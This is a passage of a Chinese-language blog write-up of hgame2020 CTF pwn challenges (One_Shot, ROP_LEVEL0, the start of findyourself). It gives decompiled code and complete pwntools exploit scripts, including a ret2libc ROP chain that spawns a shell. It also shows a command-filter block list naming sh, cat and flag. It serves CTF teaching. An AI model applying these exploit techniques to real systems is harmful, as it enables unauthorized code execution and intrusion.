class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="One-Shot"><a href="#One-Shot" class="headerlink" title="One_Shot"></a>One_Shot</h2><ul><li>题目描述：一发入魂</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week1_3/One_Shot" target="_blank" rel="noopener">One_Shot</a></li><li>考察点：字符串截断</li><li>难度：入门</li><li>分值：100</li><li>完成人数：119</li></ul><p>反汇编分析程序：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span>&#123;</span><br><span class="line">  _BYTE *v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> fd[<span class="number">2</span>]; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)fd = <span class="built_in">open</span>(<span class="string">"./flag"</span>, <span class="number">0</span>, envp);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">read</span>(fd[<span class="number">0</span>], &amp;flag, <span class="number">0x1E</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Firstly....What's your name?"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%32s"</span>, &amp;name);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"The thing that could change the world might be a Byte!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Take tne only one shot!"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  *v4 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"A success?"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Goodbye,%s"</span>, &amp;name);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>首先这题打开<code>/flag</code>文件并且把内容读到<code>flag</code>变量中，然后读一个32字节的字符串到<code>name</code>变量中，还给了一个<strong>任意内存置1</strong>的漏洞，最后打印<code>name</code>。</p><p>我们知道，在C语言中，字符串以末尾1字节的<code>\x00</code>作为结束的标志。如果打印字符串的函数没有遇到<code>\x00</code>字节，则会一直打印字符。</p><p><code>name</code>和<code>flag</code>都定义在<code>bss</code>段，而且<code>flag</code>紧紧按着<code>name</code>：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000006010C0 name            db    ? </span><br><span class="line">.bss:00000000006010E0 flag            db    ?</span><br></pre></td></tr></table></figure></div><p>因此利用<strong>任意内存置1</strong>漏洞，把<code>name</code>末尾的<code>\x00</code>置1，在程序打印<code>name</code>时，就会顺便把<code>flag</code>打印出来。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./One_Shot'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">prdi = <span class="number">0x00000000004008a3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">'name?\n'</span>)</span><br><span class="line">sl(<span class="string">'a'</span>*<span class="number">31</span>)</span><br><span class="line">ru(<span class="string">'shot!\n'</span>)</span><br><span class="line">sl(str(<span class="number">0x6010e0</span><span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># info_addr('tag',addr)</span></span><br><span class="line"><span class="comment"># log.warning('--------------')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="ROP-LEVEL0"><a href="#ROP-LEVEL0" class="headerlink" title="ROP_LEVEL0"></a>ROP_LEVEL0</h2><ul><li>题目描述：ROP is PWNers’ romance</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week1_4/ROP_LEVEL0" target="_blank" rel="noopener">ROP_LEVEL0</a></li><li>考察点：ROP攻击</li><li>难度：简单</li><li>分值：150 </li><li>完成人数：88</li></ul><p><code>ROP</code>攻击的入门级别题目，非常适合新手学习。反汇编分析程序：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> fd[<span class="number">2</span>]; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x38</span>uLL);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  setbuf(_bss_start, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="built_in">open</span>(<span class="string">"./some_life_experience"</span>, <span class="number">0</span>);</span><br><span class="line">  *fd = v3;</span><br><span class="line">  <span class="built_in">read</span>(v3, &amp;buf, <span class="number">0x3C</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;buf);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>很明显的栈溢出，由于开了<code>ASLR</code>地址随机化保护，因此需要构造两个<code>ROP</code>链，第一个<code>ROP</code>链泄漏<code>libc</code>地址，第二个<code>ROP</code>用于 <code>ret2libc</code>，执行<code>system(&quot;/bin/sh&quot;)</code>获取shell。</p><p>至于<code>ROP</code>攻击，是比较基础的知识点，百度一下就能明白，这里就不赘述啦~</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./ROP_LEVEL0'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = <span class="string">'../libc.so.6'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">prdi = <span class="number">0x0000000000400753</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">ppr = <span class="number">0x0000000000400750</span> <span class="comment"># pop r14 ; pop r15 ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line">offset = <span class="number">88</span></span><br><span class="line">payload = <span class="string">'A'</span>*offset</span><br><span class="line">payload += p64(prdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'./flag\n'</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">puts = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">info_addr(<span class="string">'puts'</span>,puts)</span><br><span class="line">libc_base = puts - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>] + libc_base</span><br><span class="line">binsh = libc.search(<span class="string">'/bin/sh'</span>).next() + libc_base</span><br><span class="line">info_addr(<span class="string">'system'</span>, system)</span><br><span class="line">info_addr(<span class="string">'binsh'</span>, binsh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop2</span></span><br><span class="line">payload2 = <span class="string">'B'</span>*offset</span><br><span class="line">payload2 += p64(ppr) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload2 += p64(prdi) + p64(binsh) + p64(system) + p64(main)</span><br><span class="line">ru(<span class="string">'./flag\n'</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info_addr('tag',addr)</span></span><br><span class="line"><span class="comment"># log.warning('--------------')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><p>week2就有意思多了，各种预期解法和非预期解法都有…</p><p>Pwn本该这样，不该只有一种解法，思路灵活些总是没错的…</p><h2 id="findyourself"><a href="#findyourself" class="headerlink" title="findyourself"></a>findyourself</h2><ul><li>题目描述：baby题有两种，这是第一种，虽然这题名字没有baby</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week2_1/fys" target="_blank" rel="noopener">findyourself</a></li><li>考察点：proc、shell基础、ls命令(非预期)</li><li>难度：中等</li><li>分值：150</li><li>完成人数：37</li></ul><h3 id="0x0-程序分析"><a href="#0x0-程序分析" class="headerlink" title="0x0 程序分析"></a>0x0 程序分析</h3><p>面函数：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+40h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">  getcwd(&amp;buf, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"where are you?"</span>);</span><br><span class="line">  read_n(&amp;s1, <span class="number">64u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;s1, &amp;buf) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"nonono,not there"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read_n(&amp;s1, <span class="number">20u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( check2(&amp;s1) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"oh,it's not good idea"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">close</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">close</span>(<span class="number">2</span>);</span><br><span class="line">  system(&amp;s1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><code>init</code>函数:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> rand_pos; <span class="comment">// [rsp+4h] [rbp-51Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-518h]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-514h]</span></span><br><span class="line">  <span class="keyword">int</span> buf[<span class="number">52</span>]; <span class="comment">// [rsp+10h] [rbp-510h]</span></span><br><span class="line">  <span class="keyword">char</span> dir_list[<span class="number">1008</span>]; <span class="comment">// [rsp+E0h] [rbp-440h]</span></span><br><span class="line">  <span class="keyword">char</span> new_dir; <span class="comment">// [rsp+4D0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> command; <span class="comment">// [rsp+4F0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+518h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0L</span>L);</span><br><span class="line">  fd = <span class="built_in">open</span>(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  rand_pos = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">read</span>(fd, &amp;rand_pos, <span class="number">1u</span>LL);</span><br><span class="line">  rand_pos %= <span class="number">50</span>;</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  chdir(<span class="string">"./tmp"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">49</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(fd, &amp;buf[i], <span class="number">4u</span>LL);</span><br><span class="line">    <span class="built_in">snprintf</span>(&amp;dir_list[<span class="number">20</span> * i], <span class="number">0x14</span>uLL, <span class="string">"0x%x"</span>, buf[i]);</span><br><span class="line">    <span class="built_in">mkdir</span>(&amp;dir_list[<span class="number">20</span> * i], <span class="number">0x1ED</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;new_dir, <span class="number">0x16</span>uLL, <span class="string">"./%s"</span>, &amp;dir_list[<span class="number">20</span> * rand_pos]);</span><br><span class="line">  chdir(&amp;new_dir);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"find yourself"</span>);</span><br><span class="line">  read_n(&amp;command, <span class="number">25u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( check1(&amp;command) != <span class="number">-1</span> )</span><br><span class="line">    system(&amp;command);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>程序流程：</p><ul><li>在/tmp/目录下创建50个文件夹，文件名随机，然后随机切换到一个文件夹中</li><li>一次执行<code>system(cmd1)</code>的机会，字符过滤规则为<code>check1</code></li><li>随后，要输入正确的工作目录</li><li>又有一次执行<code>system(cmd2)</code>的机会，字符过滤规则为<code>check2</code></li><li>但是这次执行<code>system</code>前关闭了<code>stdout</code>和<code>stderr</code></li></ul><h3 id="0x1-check1"><a href="#0x1-check1" class="headerlink" title="0x1 check1"></a>0x1 check1</h3><ul><li>允许的字符： <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a b c d e f g h i j k l m n o p q r s t u v w x y z</span><br><span class="line">A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</span><br><span class="line">/   -</span><br></pre></td></tr></table></figure></div></li><li>过滤的字符串 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sh</span><br><span class="line">cat</span><br><span class="line">flag</span><br><span class="line">pwd</span><br><span class="line"><span class="keyword">export</span></span><br></pre></td></tr></table></figure></div></li></ul><ul><li><p>docker中能利用的命令不多，除了被过滤的<code>cat</code> 和<code>sh</code>之外，还有 <code>ls</code> 和<code>cd</code></p></li><li><p><code>cd -</code>可以输出<code>OLD_PWD</code>，也就是<code>/</code>，但是并无有神马用处</p></li><li><p><code>ls</code>可以虽然可以输出当前路径下的文件名，但是题目中对比的是绝对路径</p></li><li><p>看了下<code>ls --help</code>，发现可以利用<code>ls -ali</code>，输出当前目录文件<code>.</code>的<code>inode</code>，记做<code>inodeX</code>好啦</p></li><li><p><code>inode</code>是唯一的，于是再开一个<code>shell</code>，<code>ls -alh /tmp</code>查看<code>/tmp/</code>下的所有文件名及<code>inode</code></p></li><li><p>根据<code>inodeX</code>，即可找到正确的目录名</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div 